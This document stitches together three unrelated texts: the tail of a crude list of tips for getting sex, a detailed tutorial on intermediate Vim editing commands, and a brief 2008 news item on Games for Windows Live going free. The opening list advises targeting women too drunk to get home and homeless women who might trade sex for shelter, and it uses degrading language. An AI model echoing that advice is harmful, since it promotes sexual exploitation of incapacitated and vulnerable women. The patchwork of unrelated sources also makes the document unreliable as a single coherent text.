There is almost always some ugly chick that 's shitfaced drunk who needs a ride home , then would like another type of ride .
Never forget option # 2 !
Beggars can't be choosers .
7 . Hang out by the homeless shelters and by the parks the homeless hang out .
To a chick who has n't had a bath or bed in months , a bath and bed is heaven worth trading anything for - and the only anything she 's likely to have is her cunt .
Plus , she 's likely to not have gotten laid in a long time either .
8 . Lose some weight , fatass .
Or if you 're a skinny nerd , gain some .
A little exersize never hurt nobody ( but often hurt anybody ) .
9 . Throw those taped up glasses away and get some contact lenses .
They 're dirt cheap these days .
And buy some un - dorky clothes ; you 're likely to know at least one non-nerd , get them to help you .
10 .
Have a shitload of money , and flaunt it .
A huge cock wo n't get you laid , but nothing turns a chick on like a huge wallet .
After all , Bill Gates not only got laid but married ( finally , at age 40 ) , and his wife 's only a little bit butt ugly !
And always remember , you wo n't get laid being shy .
Remember rule # 6 ; a few shots of Jack Daniels or Cuervo will cure your shyness .
Now go out there and catch something .
A Slightly Advanced Introduction to Vim
By Pranesh Srinivasan
What is it ?
" It is the little things that make up great men . "
This introduction is about the little things .
Things that help ease everyday tasks but go a long way into making you a better user , editor , programmer - a better computer user .
This piece started out as a ' write - while - you - learn ' exercise while reading a vim tutorial .
As I kept writing , I felt that with a little more work , and some polishing , this could be turned into vim introduction of sorts .
Who is it for ?
This is not a five minute introduction to vim for a complete newbie .
I presume you have used vim before and are comfortable with moving around , and making changes .
Although : vimtutor is not a prerequisite to this tutorial , I highly recommend it .
This document contains some mnemonics , and some slightly advanced features of vim that can help the average vim user / programmer increase his / her productivity by leaps and bounds .
Why does it exist ?
I find a large number of people around me who have used vim a few times while writing programs .
Very few of them have grown into becoming effective vim users .
The majority drop out because of its initially daunting interface .
A good number of the interested users switch to emacs , because they think the ' power ' just is n't there with vim .
I am not saying emacs is bad , but I just cannot stand decisions made on lack of information .
This document is written with an aim to convert the odd " I - just - use - vim - over - ssh " user to a full - fledged user , and to illustrate the kind of power that vim provides .
Most importantly , vim is not just for programmers ; it can be used by anybody and everybody who deals with text in any form .
Vim runs on many platforms including Mac , Windows , and Solaris , and is a standard on every Linux machine .
Someday you might find yourself sitting on a terminal with only vim installed .
Some Notation
Any command mentioned here is to be typed in the normal mode .
The normal mode is the mode one gets when he / she presses < Esc > in vim .
There are three main modes in vim : insert , normal and visual ( vim documentation says there are six BASIC and five Additional modes ... )
Commands are generally indented with respect to the rest of the text .
Any command prefixed by a " : " is also to be typed in the normal mode , with the colon .
Of course they have to be suffixed by an ' Enter ' or carriage return .
In cases where a command has to be typed in the visual mode , it will be mentioned explicitly .
The commands described here should work with any recent version of vim , or gvim .
I used vim 7.0 for this , and some features like omni-completion and spell checking are available only on it .
If several commands in this document do not work , you might wish to try : set nocompatible followed by a carriage return or ' Enter ' in your vim .
Just in case
Just in case you are new to vim , or have completely forgotten the vim commands , and are still brave and enthusiastic to try reading this , I wo n't leave you behind .
Here is a five minute tutorial to vim .
Type ' vim ' followed by a filename in your prompt to bring up vim .
$ vim filename #
Or , for a GUI interface : $ gvim filename
This will launch vim with the default directory in vim set to the directory the terminal was in .
You can quit vim by typing
:q # Or , for the ' quit without saving ' mode : :q !
Once , in vim , you can move around using h , j , k , and l .
h - left j - down k - up l - right
Try to refrain from using the arrow keys .
These keys were chosen , because they lie on the home row and save the user a lot of time , and unnecessary fumbling with the arrow keys .
After you get used to them , you 'll hate having to use arrow keys in other text editors .
To insert text at a location , hit i .
This will put you into insert mode .
The bottom left of your screen should read something similar to
-- INSERT --
[ This presumes that ' showmode ' has been set .
If you do n't see the above , and would like to , add ' set showmode ' to your ~/.vimrc file .
-- Ben ]
Type in text till you are done .
Use backspace if necessary .
Avoid using delete and the arrow keys .
If you are done , or you think you need to navigate elsewhere , hit < ESC >.
Control + [ should also do .
I do not recommend the second however , since it is present only as backward compatibility on several old machines that did not have the Esc Key .
You are now back into the normal mode .
You can move around with h , j , k , l again .
That should be just enough .
Spend some time trying to get comfortable with it .
Save and exit with
:w followed by :q or simply : wq
Let 's begin !
The art of insertion
Several people around me often tell me that their greatest difficulty with a major - mode editor like vim , is that they never know which mode they are in .
If you are one like them , the answer is pretty simple .
Vim was not designed to be used the way you are using it .
Vim was designed for short bursts of insertion .
Vim was designed around the idea that people tend to type text for a much shorter time than they spend reading , editing , and revising it .
Therefore if you need to get up for coffee , or pick up the phone , or are done with that sentence of yours , hit the Esc button .
Vim provides several keys to help you get to the right cursor position to insert characters .
We list some of the more useful ones here .
i insert BEFORE Cursor a insert AFTER Cursor ( append ) shift +i ( or I ) insert at BEGINNING of line shift +a ( or A ) append at the END of line
Noticing similarities ?
Good , because that is what vim is about .
A lot of vim is actually very intuitive .
Great !
So how do you go about creating new lines ?
o create a new line BELOW the current line , and put the cursor at the start of the new line .
shift+o ( or O ) create a new line ABOVE the current line , and put the cursor at the start of the new line
Wonderful !
I do not have to < End >< Enter > or < Home >< Shift + Enter > .
How do I edit text ?
r replace the char at the cursor position and come back into escape mode .
In other words , replace a char shift+r ( or R ) go into what people would generally call the replace mode .
Vim is pretty intelligent .
Have a look at how the backspace works in this mode .
Ok !
How do I remove characters ?
x remove char under the cursor .
Similar to delete .
shift+x ( or X ) remove char before cursor .
Works like backspace .
Visual Mode
Selecting in vim , can be done with the mouse , if mousemodel is set properly .
See : help mousemodel on this .
But the recommended way of selecting is to use the visual mode .
In normal mode , hit v .
You will notice at the bottom left of your screen
-- VISUAL --
or something similar .
Moving around with h , j , k , l will now select text .
You can delete ( cut ) the selection with x , or copy , paste , them with keys y and p .
As soon as you have done any of these , you should be out of visual mode .
To otherwise exit visual mode , you can hit the magic key , Esc .
y stands for Yank and p for Paste .
Try them out .
More on this will follow .
Undo and Redo
With all that copying and pasting , you are bound to make mistakes .
So how do you undo ?
Control +Z? No .
In normal mode simply hit u .
Are you beginning to see the power of major modes here ?
Keys are often very short and intuitive .
How do you redo ?
r?
No , both r and R were taken by replace modes .
You do Control + R to redo .
How much can you undo ?
Quite a lot actually .
In the more recent versions , you can undo to any point since the current session of vim was started .
The latest version of vim at the time of writing , vim 7.0 even has support for undo branches .
You can say something like
: earlier 10 m # or : earlier 2h
and it would take you to 10 minutes or 2 hours ago .
( If vim was open two hours ago . )
Similarly : later .
What we have covered so far , are just the mere basics .
This is stuff that most people know .
If you did n't , you do now !
What comes from here on is the important part .
Learning to use vim as a Swiss Army knife for text and programming .
Copying , Deleting , Pasting
In vim , a selection can be copied by yanking , or y .
This is different from emacs ' yank , which pastes .
In vim , the paste command is p. Pasting and yanking can be done into registers too .
There are no deletes in vim .
Everything goes into the paste buffer - or , optionally , into a register named with a single character from the { a - zA - Z0 - 9} list .
y : copy selection .
( Use visual or implicitly copy like yas to yank a sentence - see Mnemonics below ) yy : copy current line .
Y : copy current line .
d : delete ( cut ) selection .
Same usage as y. dd : delete ( cut ) current line .
D : delete from here till end of line .
p : paste selection ( Pasting is intelligent .
If you copy a whole line , it will put it below the current line . ) see ' ddp ' below in keyboard combos
Note that the scope of the action of Y is different from that of D ; indeed , Y = yy .
If you want to set it to what would you have expected normally read the section on mapping below .
" fy : copy selection and paste in register f " fd : delete selection and paste in register f ( This works with " xyy " xY and all other similar things too . ) " fp : paste what is present in registers f .
You can look at the registers by using the ' : reg[ isters ] ' command .
In your version of vim , uppercase registers may be restricted by default , so I suggest not using them .
[ Using an uppercase register name appends a 'y 'ank or a 'd 'elete to the existing register content ; the lowercase version replaces it .
-- Ben ]
The other registers are special , often storing text , or marks ( see below ) for other commands .
Therefore these should not be touched .
An exception is the ' +' register .
Vim 's clipboard is independent of the external OS clipboard .
Vim imports the text in the OS Clipboard into the ' +' register .
In order to paste something copied into another application use the ' +' register .
Command : " +
p
As expected , copying or cutting into that register '+ ' will write to the OS clipboard .
So if you want to copy something into another program , use " +y
Mnemonics
Mnemonics are commands to perform common tasks .
What separates them from being normal commands is the underlying ability to remember them from the task they do .
To understand and use mnemonics well , one must first understand text objects .
See : help text - objects , or read the subsection under " text objects " below .
As an example of a mnemonic , take ' ctx ' :
ctx - change till x ( deletes from here until first character ' x ' , and puts you insert mode ) dtx - delete till x
There are several objects in vim that act as text - objects : words , sentences , blocks , etc. .
Vim gives you the power to use them in selections and edits .
daw - delete a word dw - delete from here till end of word daW - delete a Word ( includes special chars , except space ) dW - delete from here till end of Word das - delete the sentence we are in daB - delete an inner Block of code {}
Rules like the above can be applied in general to text objects :
s - sentence w - word W - WORD t - tag ( ' dat ' removes from < xml - style - tag > till </ xml - style - tag > p - paragraph B - block of code ( ' { ' or ' } ' works only for C - style blocks )
Bracket forms : ( or ) - parenthesis ( ... ) [ or ] - [ .. ] < or > - refers to <....> { or } - a { block also referred to by the above b Quote forms : Just like the bracket forms " , ' , ` - can be used for referring to text - objects delimited by them .
These things can therefore be used in a manner similar to
da < text - object > : delete a text object di< text - object > : delete the inner part of the text object .
( This leaves the ( ) or the spaces in words or the {} in blocks )
Their use does not end here ; remember , vim is intelligent .
They can be used during visual selections as well .
In visual mode hit as to select a sentence .
Similarly a word can be selected with aw or a block in with a '} ' .
Read : help text - objects for more info .
Prefixing Numbers
Almost every command can be prefixed with a number to repeat it in a sensible way .
E.g. ,
# Go down 6 lines 6 j # Delete the next 10 lines 10 dd
This is a very underused function that can greatly improve text editing ease .
Slightly Advanced Navigation
Simple Navigation on a line
Vim provides you with several one touch commands to get to a particular character on the line .
This coupled with a good use of vim 's insertion techniques should put you where you want with almost no effort .
We first learn how to move by words , since moving by characters can often be slow and demanding .
( ptca = puts the cursor at ) w - Takes you a word ahead .
ptca the start of the next word .
( ' W ' does nearly the same thing , but for " words " that may include special characters ( excluding ' space ' ) ) e - ptca the end of this word .
If the cursor is already under the end of this word , takes you to the end of the next word .
b - move back a word ; ptca the start of the previous word
Next , it is important to know how to get to particular positions on a line .
Important places are the start of the line , and the end of the line .
0 - ptca the start of line
Remember regular expressions ?
Vim tries to make the learning curve easier .
The following two commands should come naturally if you keep regular expressions in mind .
^ - ptca the first non-blank character of line $ - ptca the end of the line
The following commands are really useful as well .
They let you get to the nearest instance of a character on a particular line .
fx - ptca at the next instance ( in the forward direction ) of character ' x ' in the same line .
Fx - ptca the previous instance of the character
These also form the building blocks whenever generic movement is required - like in macros .
The g commands
The ' g ' commands , as I call them , refer to a useful set of ' goto ' commands that ease moving around .
Merely stating them should suffice .
1G - takes you the start of the file 0G - to the end of file
A good way to remember this is that ' 1 ' often appears before ( to the left ) of ' 0 ' on the number row ( above the qwerty row ) on a qwerty keyboard .
gD - takes you to the first ( intelligent ) instance of the word under the cursor in the same file .
It is intelligent , since in a programming language , it takes you to the definition or the declaration of the function or variable .
gj - goto next line .
( Huh ? ) .
This is the same as j when the lines do not wrap .
When the lines do wrap around the editor , hitting j would take you over to the next new line .
gj will take you the same character in the next row .
( Try it ) .
gk - Similar .
( To avoid wrapping do : set nowrap )
Note indeed that the small ' g ' is called the extended operator in vim .
It performs a lot more than merely goto .
Indeed the user can see : help g for more information .
I 'll mention a few useful ones :
gf - Open the filename under the cursor ga - Print ascii value of character under the cursor .
gs - put vim to sleep for 1 second .
Of course , like most vim commands , you can prefix this with a number to get a general sleep command .
Mark Mnemonics
Marks are a very useful feature in vim .
They enable you to mark your current position , and move away for a while .
You can then go back to the old cursor position by hitting a couple of keys .
ma - mark current position with letter ' a '. `a - go back to mark a ' a - put the cursor at the start of line a : marks to see a list of marks made .
Marks are intelligent .
Even if you make edits to the text before the mark , thereby changing its line number or make edits on the line itself ( affecting character number ) , vim will manage the marks aptly .
You will still be able to return to your old mark with the same key combination .
Note that mark movements are often called jumps .
There are a few registers that are set by default .
I list a few helpful ones below :
`` - go back to the last cursor position before a jump .
`. - go back to where the cursor the last time an edit was made .
This puts your cursor at the start of the edit . '( - go to the start of the current sentence ') - go to the end of the current sentence '{ - go to the start of the current paragraph '} - go to the end of the current paragraph
Moving to a line
To navigate to line foobar , simply type : foobar or foobarG .
E.g. , to navigate line 234 :
:234 234G
I strongly recommend using the : number , because you will be able to see the line number you are typing .
As always , remember in vim , if you make a mistake in the middle of a command hit < Esc >
Of course , if you have been there before , and go there frequently enough , I would suggest marking it .
Even though it does not seem that great a feature , it comes in handy when you have to debug programs .
Navigating Screenfulls
As mentioned earlier , a design aspect in vim was to allow your hands to stay on the home row .
So how do you do it without moving your hands to PageUp and PageDown ?
Control +( f/F ) move forward a screen ( PageDown ) Control + ( b/ B ) move backward a screen ( PageUp ) Control+u moving up half a screen Control+d moving down half a screen
There is one last thing you should know about navigation .
In case the line number does not show to the bottom left ( ruler is set to off ) , just hit Control + G .
This should show you the line number and some other statistics in the bottom status bar .
Power Keystrokes
Think of Power Keystrokes as combos in an arcade - style fighter game .
It helps you do several mundane oft - repeated tasks with a couple of key strokes .
The meaning of each of the key strokes is already known , just like light punches and hard kicks .
Putting them together in specific ways produces several desirable results .
We illustrate a few of them to follow .
xp - switch the current char and the next ddp - switch the current line and the next A ; - append a semicolon to the end of the line . >> - increase indent of current line .
<< - decrease indent of current line .
Finding and Substituting
Finding is a relatively simple job in vim .
Just hit '/ ' in normal mode , and start typing .
Hit Enter to search .
The key n will take you to the next search , and Shift +n or N to the previous .
A very useful tip when it comes to searching is the ' # ' key and the ' *' key .
These search for the word under the cursor , backwards and forwards respectively .
To sum it up ,
/ foobar < Enter > search for foobar n go to the next result N go to the prev result # search for the word under the cursor ( back ) * search for the word under the cursor ( fwd )
The substitute command is slightly more complicated .
However , when in the right hands it can prove to be wizardly .
The syntax of the substitute command is as follows :
:[range]s[ubstitute ]/pattern/string/[options ]
The range is a very interesting argument to play around with .
Here we take a look at vim's : help range to see what we can do .
Range
What it means
------
--------------
{number} an absolute line number .
the current line $ the last line in the file % equal to 1 , $ ( the entire file ) * equal to ' < , '> ( the Visual area ) 't position of mark t ( lower case ) / {pattern} [ / ] the next line where {pattern} matches ?{pattern} [ ? ] the previous line where {pattern} matches \/ the next line where the previously used search pattern matches \?
the previous line where the previously used search pattern matches \& the next line where the previously used substitute pattern matches
Most substitution commands in vim are often written as :%s/ old_string / new_string , for obvious reasons .
Again looking into vim's help for the options we get ( in brief ) :
Option
What it means
------
-------------- c
Ask before substitution .
( Check ) e Do n't cough Error messages if no such pattern is not found .
g Global ( replace all occurrences in the line ) .
i Ignore case .
I Do not ignore case .
n
Do not substitute .
Only return the number of successful matches .
For , e.g. , a substitution of the form
:1,'bs/dog/cat/ceg
would replace dog with cat after checking with you , for all instances in that line , from line 1 to the line where mark was set as b .
It will not throw any errors if ' dog ' was not found .
See the section on " Dealing with Multiple files " for substituting and searching across multiple files .
Useful Navigating Techniques for Programmers
Even though this could have been fit into the section on navigation above , I decided to make it another section to emphasise it further .
Vim provides various techniques to the programmer .
The most useful one is the jump parenthesis shortcut .
% jumps between matching pairs of parenthesis ( ) {} [ ] <>.
With the match - it addon , it will jump between matching tags in html files - between the < div ... > and the corresponding </div >
One might also find the ' goto ' command very useful .
gD takes you to the global declaration of the variable or function under the cursor .
However , this will only do so in the same file .
gF takes you to the filename under the cursor .
Very useful for jumping to header files .
Vim also integrates with ctags , in a nice and natural way .
However , I suggest that you read the help manual for this .
Folds
Folds are a wonderful way to organise and group code .
Of course , it can be used for editing text , LaTeX documents , and several other things , but the clarity it gives to code is fascinating .
There are several folding methods available in vim .
I shall describe only the manual ones , and briefly mention the rest .
More information can be gotten from : help fold .
As with a few other things of this kind , I feel that folds are best illustrated by an example .
Pick a text file , preferably a large one , that does not fit on one screen .
Open it in vim , and place your cursor anywhere you like .
In normal mode , type
zf3j
After you press j , vim will create a fold covering the next 3 lines .
How did it happen ?
Well , zf means to close a fold , and knowing vim 's movements 3 j is to come down 3 lines .
So from the current position to 3 lines down , vim folds .
Vim also supports folding using visual mode .
Simply select a piece of text , and type zf .
It should fold as well .
Another option is to specify a range in command mode .
For instance , if you wanted to create a fold from 3 lines above to 101th line , you would do
: -3 , 101 fold
and hit enter .
From 3 lines above to line 101 , vim should have folded .
Vim will suitably reverse the range for you if 3 lines above was greater than 101 after prompting .
You could have also used markers if necessary .
Vim can also make some smart text selections .
Suppose you are writing C code .
You can position your cursor on a ' { ' and hit
zfa}
This will fold till the matching ' } ' .
Of course , as we learnt above you could also use the more natural
zf %
to perform the same operation .
Finally , you can also use a search - fold technique .
You can hit z/ and start typing for the string required .
It will fold from the current line to the first instance it finds the search string .
Therefore , typing in
z /SearchString
would fold appropriately .
Like someone once said , folding is only half the fun .
At some point , you 'll no doubt want to unfold the text .
To do this , simply place your cursor on the same line as the fold and type
zo
This will reopen the fold .
This will not delete the fold .
Type
zc
to close it back up when you are finished .
To move between various folds quickly , use
zj for next fold zk for previous fold
Nested folds
As said before , vim allows nested folds .
If you use zo , it will open only the first fold ; the other folds will stay closed .
The following commands will prove helpful in dealing with nested folds
z O ( shift+o ) open all nested folds on that line ( zc will close them too ) zr open the highest level of folds in the file .
For eg , all the first level folds .
zR open all folds of all levels in the file zm close all highest level of open folds in the file .
zM close all folds of all levels in the file .
zE delete a fold
Delete a fold with caution .
vim 's undo and redo features do n't apply to folds ; if you delete a fold , you can't press u and bring it back , and the .
command wo n't run the last fold command .
How does vim deal with folds when searching for text ?
It acts as if the fold is not present .
If the word is found while searching within a fold , it will open the fold .
Vim is untidy with this .
It does not close the fold when you move your cursor out .
However a quick zm will restore the folds .
Once you close the document you created all the folds in , all the folds will be lost .
Therefore , you must ensure to save your folds before you exit .
You must also load the saved folds after you open it again .
This can be done with the following commands .
: mkview make a foldview : loadview
You can of course automate this by adding the following to your .vimrc :
au BufWinLeave * mkview au BufWinEnter * silent loadview
There exist other folding methods like those mentioned before .
Notable ones are diff ( via ' vim - d file1 file2 ' ) , which set only the edited lines unfolded , and indent which folds depending on indent .
Visual mode Selections
Visual mode provides what can be called 3 minor modes .
v - enters visual mode .
Shift+v - enters visual mode , where only lines ( in full or none ) can be selected .
Ctrl+v - enters rectangular visual ( block mode ) .
Play around with these for a while .
This should let you become more adept at using Visual .
The rectangular visual mode is very useful in temporarily commenting code , or in removing comments .
Suppose we had a code block like
int main ( ) { register int k ; ... ... }
Put your cursor at the start of the main declaration .
Hit Ctrl+v followed by 6 j .
Then hit Shift+i and type //. Finally hit Esc to come out of the visual mode .
This should comment the entire block with C++ style comments .
Filters
Vim lets you run shell commands from itself by typing
:! shell - command
With the concept of a GNU - like " one utility per action " system , the concept of filters is inevitable .
By using a filter , we can send text in our buffer ( screen ) to an external command - say ' indent ' or ' sort ' - whose output is then sent back into vim .
Using the range concept given above , one could write things like
:%!gpg
to encrypt one 's message with their personal key .
Here are a couple of other examples
: %!tr a-z n-za-m ( This will ROT13 our data : ) ) :.,+5! sort
As mentioned above in the range section , . represents the current line .
A positive number means below , and a negative number means above .
Making Projects
With tools like filters learnt above , we could ' make ' our projects with commands like
:!gcc - Wall - g foo.c -o bar
or syntax check them with
:!gcc - fsyntax - only %
Vim however provides its user with a make command .
You can set a make program with the command
: set makeprg=gcc\ - g\ %
and subsequently make by doing
: make
It accepts command line arguments , enabling you to do things like
: make all : make install
The default makeprg is set to ' make ' in the directory vim currently is in .
This by default was the directory our terminal was in , when vim or gvim was called .
See the section on " Browsing files with Vim " below to find out the current directory and to change it .
If there were any errors , vim will display them to you .
If you are using a fairly common language , vim can even parse the error file and tell you a whole lot more .
Pressing ' Enter ' in the error window should by default take you to the first error .
In the case the errors can be parsed , the following should be the holy - grail combinations :
: cc - will show you the current error : cn - will take you to the next error : cN - will take you to the prev error : copen - opens the error window in a small buffer where you can browse errors .
Hit < Enter > to be taken to that error .
This should make your compile -> edit -> compile cycle a lot easier on you .
Dealing with Multiple Files
Often , programmers or developers have multiple files in their buffers .
I assume you know how to split windows , and all that jazzy stuff .
If not , you could read the Vim tutorial : help vsplit
From vim7.0 onwards , tabs are supported .
Tabs can be opened by
: tabnew file.txt
To cycle through tabs one would use : tabnext ( : tabn ) and : tabprevious ( : tabp ) .
One can by default , also go to the previous / next tab by using Control + PgUp and Control + PgDwn provided of course there are no other open programs mapped to that application .
( A common program is gnome - terminal with multiple tabs . )
Another way to open and edit multiple files is the buffer .
Any file you open is in your buffer till you close it .
To open a file in a buffer simply use the normal edit command
:e foo.txt
For dealing with buffers , one should find the following commands useful :
: bfirst switch to the first buffer : bn switch to next buffer : bp switch to prev buffer : blast switch to the last buffer :ls list all currently open buffers : buf foo. txt switch to foo. txt in the buffer
The main power of buffers comes in dealing with them in a batch .
Vim has the command bufdo , which allows you to run a command over all the files in your buffer .
: bufdo {cmd}
Quoting the vim Manual ,
What this basically does is
: bfirst :{cmd} : bnext :{cmd} etc ...
When the current file can't be abandoned and the [ !] is not present , the command fails .
When an error is detected on one buffer , further buffers will not be visited .
Unlisted buffers are skipped .
The last buffer ( or where an error occurred ) becomes the current buffer .
{ cmd} can contain ' | ' to concatenate several commands .
{cmd} must not delete buffers or add buffers to the buffer list .
To search in multiple files one would simply do
: bufdo / searchstring /
To search and replace for example , one might do
: bufdo %s/oldtext/newtext/ge
There are other cool things you could do with buffers .
You could backup your entire project into a tarball by doing something like
: silent bufdo ! tar - rvf backup.tar %
Of course , the files do not have to be open in vim , you could set the args variable in vim , and use a similar argdo .
For eg. to indent all files in foobar / one would do
: args foobar /* : argdo ! indent % | update
update writes the file only if changes were made .
Browsing files with Vim
Open a directory with ' vim path / to / dir ' or from within vim , :e path / to / dir .
A file browser opens up that one can use to browse , and make modifications .
Use < Enter > to enter a directory , and j , k to move up and down .
The following should be helpful :
d - to make a directory D - to delete one R - to rename
You can set the directory vim is in by using the cd command as
: cd path / to/dir
As expected you can use : pwd to find out the present directory vim is in .
Having the netrw plugin installed , allows one to access and edit files on a remote machine as well , through protocols like ssh and ftp .
Mapping Commands and abbreviations
Mapping commands and abbreviations are an essential part of the programmer 's lifeline in vim .
Commands can be mapped as follows :
: map < keystrokes > command - to - be- executed
This will map it in both modes .
Use nmap if you want to map it only in the normal mode and imap for the insert mode .
As an example , one might consider
: nmap \cc !gcc\ - g\ %
This would mean typing \cc ( quickly ) in the normal mode would execute the gcc compilation on the current program with debugging enabled .
Abbreviations are really useful things to have in one 's armory .
They let you substitute a larger word for a smaller one , or fix your common mistypes .
An example should state this clearly enough :
:iab cs Computer Science .
: iab mroe more
This would replace 'cs ' ( followed by the space ) with Computer Science every time I type it , and replace ' mroe ' with ' more ' .
The i stands for insert mode , and the ab for abbreviate .
One could do :ab as well , though it is not recommended .
( It might substitute one of your \cs commands with ' \ Computer Science ' . )
To unset the above mapping or abbreviation simply type
: unmap \cc or : unab cs
respectively .
If you want these abbreviations or mappings to remain over various uses of vim , simply put them in your '~ /.vimrc ' .
As a final example , let us take the remapping of Y to the more intuitive way of using it .
You would do
: map Y y$
for this session , and to store it permanently , append
map Y y$
to your '~ /.vimrc ' .
Macros
These are amazingly powerful tools to help you automate your work .
It is like a writing a program to help you do some word processing , without having to learn another programming language .
Imagine the power you 'd have if you could write programs with vim keystrokes to process text .
This is precisely what Macros allow you to do .
Macros take a set of keys as input from you and store them in a register of your choice .
( Yes , this is the same set of registers you copy into and paste from , so do n't accidentally overwrite them ) .
You can then run the command specified by the keys in that register .
The syntax for declaring macros is :
qx <set of commands >q
( The second q has to be hit in the normal mode only . )
This stores the set of commands in register x .
To run it simply type @x. @@ runs the last run macro .
Macros are best illustrated with an example .
Suppose you have a table , the field delimiter being ':'.
An example is shown below :
Name Age Fav. Animal Bob : 24 : Duck Harry : 18 : Tiger John : 36 : Dog ... : .. : ....
Suppose the list is very long consisting of 50 or so names .
Your job is to extract everybody 's favourite animal and put them in a list .
Of course you could use sed , but you could do it using macros with ease as well .
To do so you would do the following :
Put your cursor on Bob , and hit q followed by a register letter say a ( for animal ) Type 2f:w which should take you to the second cursor , and then to the start of the next word , " Duck " .
Yank the word with a yaw .
We want to move to the end of file , and paste this .
However , we should mark our position before we leave .
Mark it in some register , say f , with mf .
Goto end of file with 0G .
Put in a new line with o and come back to normal mode with < Esc > paste with p
Go back to the original cursor position with `f Finally to make the macro repeatable put the cursor at the start of the next line , with j0 .
Exit the macro mode by hitting q .
If you now type : regs you will see the following in register a :
2f:wyawmf0G0 ^[ `fj0
( < Esc > has been replaced by ^[. )
Now to run this macro simply put your cursor on Bob , and do @a .
It should perform the macro and leave you at the beginning of Harry .
You can repeat it once again with @@ or simply with a full stop , . ( repeat last command ) .
To repeat it several times you could say 50@@ , which would repeat it 50 times .
If you found this macro very useful , you could copy it into your .vimrc , replace ^ [ with < Esc > and map it to a keystroke .
As an example , the above macro would transform to
" Collect all the animals at the end of the file nmap \fa 2f : wyawmf0G0 < Esc>`fj0
Macros are terribly underused .
Learn to use them effectively .
Completion
Vim now supports omni-completion as well as intelligent buffer completion .
The following commands should sum this up :
Ctrl -n - complete ( a small popup should appear .
You can browse this with Ctrl-n and Ctrl -p .
Simply continue typing when done .
Ctrl-x f - complete this filename .
Ctrl-x i - complete from included files .
SpellCheck
With Vim 7.0 , Vim now supports built - in spellchecking .
To enable it simply type
: set spell
and to disable
: set nospell
You can navigate spelling errors by using ]s and [s .
You can correct them by hitting z= .
This will pop up a list of possibilities that you can choose from .
Common Settings
This section simply describes a list of common settings that people might find useful .
You can see my .vimrc to look at what I use .
Options are set to true using : set option , unset ( set option to false ) using : set nooption and set to other values using : set option=value .
You can invert an true / false option by using : set invoption .
Options often have shorter names that enable you to type them faster .
An example would be ' ft ' for filetype , enabling you to do : set ft=value instead of the longer : set filteype=value
Options
autoindent - automatically indents your cursor on the new line , depending on where this line started .
smartindent - is smarter than autoindent .
Knows to go back a tab , if you have closed a block using ' { ' or goes front a tab if you have opened one with ' { ' .
This is also language specific , and knows the block delimiters for several languages .
hlsearch - sets highlight of search on or off .
incsearch - sets incremental search on or off .
Incremental search is the name programmers give to " find as you type " search .
This is VERY useful .
expandtab - fill tabs with spaces when a tab is hit .
The number of spaces depends on the tabstop option .
showmatch - show matching ( ) , {} , [ ] when typing .
Very useful for programmers .
ft=VALUE - set filetype = VALUE
As an example you could do
: set hlsearch switches hlsearch on : set nohlsearch switches hlsearch to off : set invhlsearch inverts hlsearch ( which was previously off due to the last command ) to on .
To change file types from ' txt ' to ' html ' you would do
: set ft=html
and if you still find no syntax highlighting ,
: enable syntax # or : syntax on
For help on an option , do : help option
There is a very useful option that I often use .
I am one of those compulsive < Esc > hitters .
If I am decide to change my command , or abort my command , or simply feel itchy I hit the < Esc > button ( often more than once ) .
Vim deals with it graciously , and simply beeps , which does not bother me at all .
However , in a work situation like the office or the lab , people sitting near you may get irritated with the beep (s ) .
You can tell vim to switch off the sound alert , and switch on a visual one with
: set visualbell
Try hitting two < Esc > 's in a row now .
The screen should just flash .
Miscellaneous Commands
This section lists a few miscellaneous commands that would not fit anywhere else in this document .
Shift+j ( or J ) -
This will bring up the next line and join it to the end of the current one .
Learn to use this well .
It is what people in other editors would perform as < End >< Del > .
A mnemonic for Join the previous line with current line .
Shift+k ( or K ) - Displays the man page for word under cursor ~ - Swap Case of character under cursor , and move to the next character . . - repeat the last command , whatever it is .
( The command could be the insertion of a sentence or even a macro ) .
What most editors would call ' repeat ' .
Vim can also increment and decrement numbers for you .
This is extremely useful in writing larger more generic macros .
As usual , numbers prefixed with a ' 0 ' are considered octal ; numbers prefixed with a ' 0 x ' are considered hexadecimal .
Numbers not beginning with a zero , are decimal .
Control + A - Increments the number under the cursor Control +X - Decrements the number under the cursor
Useful Plugins
Vim , much like Emacs is an extensible editor .
There are thousands of plugins for vim , that make one 's life a lot easier .
Purely for completeness , I list some of the more popular plugins here
taglist explorer opens a wonderful little function list by your side , just like an IDE matchit enables matching of regular expressions using % gpg encrypts your data with with your private key .
Performs decryption as well .
calendar displays a calendar in your vim window , to which you can add notes , et al , ala org - mode minibufexplorer displays all open buffers and tabs on a horizontal list at the top / bottom of your screen .
tetris yes , with rotating game play and high scores !
Besides all this , there are a lot of programming suites available for the more popular languages like C/C++ , LaTeX , Java , Python , Ruby , etc ...
There are currently more than 2200 plugins available at http://vim.org, some of which are bound to make your life easier or a little more fun .
Taking advantage of such a wealth of hard work and talent is more than just good fun ; it makes a lot of sense .
When all said and done , it is up to you to become proficient in using vim .
There is no harm in thinking out what is the best way to do something when you do it for the first time .
It will save a lot of time in the future .
At one point of time , all efficient vim users thought about the commands they were typing .
Reflect on it , before it becomes a habit .
It might be slow initially , but the effects you reap later on will be very high .
If you are the kind who keeps forgetting which mode insert / normal / visual mode you are in , remember , as mentioned before that vim is meant to be kept in the normal mode .
Words are to be inserted in short bursts .
As soon as you finish typing / selecting , come back to normal mode , by hitting < Esc > .
Also , remember that vim commands can be repeated by prefixing numbers to the commands .
Like 7 j or 3w , etc. .
This is probably the most underused vim powertool .
Write macros that can be repeated too .
Finally , remember to customise your .vimrc with useful functions , macros , abbreviations , and settings .
Before hurriedly writing your own plugin , search vim.org .
There are lots of plugins that can help improve daily productivity .
And yes , do remember that vim's : help is a wonderful piece of documentation .
Good Luck Vimming !

During its ongoing Gamefest 2008 developer conference in Seattle , Microsoft announced that it is removing all subscription fees from Games for Windows Live services .
This fall , it also plans to launch a new Windows game marketplace akin to its existing Xbox Live Marketplace .
Content , such as new gameplay , demos , and trailers , can be free or paid based on publisher choice .
Features of the PC - based Live service , which have varying levels of support among Games for Windows - branded titles , include skill - based matchmaking , a friends list , voice and text chat , and achievements , some of which were already free .
The system 's user interface will also be redesigned .
Said Microsoft's Entertainment Business Division CTO
Chris Satchell during a Gamefest keynote address , " The first UI was good but it was too console - centric .
It was n't really what Windows gamers wanted .
We have a new UI that 's consistent with the way Windows gamers want to interact .
It 's free to you as a developer , and we 're reducing the technical requirements .
" I believe , from hereon , Games for Windows Live is going to take off , " Satchell added , showcasing Relic 's upcoming Live- enabled , PC - exclusive title Warhammer 40,000 : Dawn of War II as an example of a game that makes full use of the program 's offerings .
